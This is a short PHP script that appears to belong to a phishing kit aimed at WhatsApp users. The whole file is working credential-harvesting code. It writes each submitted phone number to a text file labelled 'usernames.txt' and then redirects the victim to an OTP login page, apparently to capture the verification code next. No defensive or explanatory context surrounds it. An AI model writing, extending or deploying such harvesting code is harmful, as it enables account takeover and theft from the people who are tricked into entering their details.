<?php
file_put_contents("usernames.txt", "WhatsApp Number: " . $_POST['number'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
?>